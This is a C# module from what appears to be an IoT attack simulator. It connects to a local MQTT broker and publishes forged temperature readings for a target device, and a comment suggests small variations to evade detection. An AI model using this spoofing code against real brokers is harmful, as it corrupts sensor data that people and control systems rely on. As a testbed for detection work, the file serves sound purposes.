using MQTTnet;
using MQTTnet.Client;
using System;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace AttackSimulator
{
    public class DataTamperingAttack : IAttackModule
    {
        private readonly string targetDeviceId;
        private readonly Action<string> log;

        public DataTamperingAttack(string id, Action<string> logAction)
        {
            targetDeviceId = id;
            log = logAction;
        }

        public async Task ExecuteAsync()
        {
            var factory = new MqttFactory();
            var client = factory.CreateMqttClient();
            var options = new MqttClientOptionsBuilder()
                .WithClientId(Guid.NewGuid().ToString())
                .WithTcpServer("localhost", 1883)
                .Build();

            await client.ConnectAsync(options);

            for (int i = 0; i < 10; i++)
            {
                // Veriyi tahrif edelim: örneğin sıcaklık -500 derece gibi saçma bir değer
                var payloadObj = new
                {
                    deviceId = targetDeviceId,
                    temperature = -500 + i, // küçük değişimlerle tespit zorlaştırılabilir
                    timestamp = DateTime.Now.ToString("O")
                };

                string payload = JsonSerializer.Serialize(payloadObj);

                var message = new MqttApplicationMessageBuilder()
                    .WithTopic($"sensors/{targetDeviceId}/data")
                    .WithPayload(Encoding.UTF8.GetBytes(payload))
                    .Build();

                await client.PublishAsync(message);
                log($"[Data Tampering] Bozulmuş veri gönderildi: {payload}");

                await Task.Delay(1000); // Her saniyede bir gönder
            }

            await client.DisconnectAsync();
        }
    }
}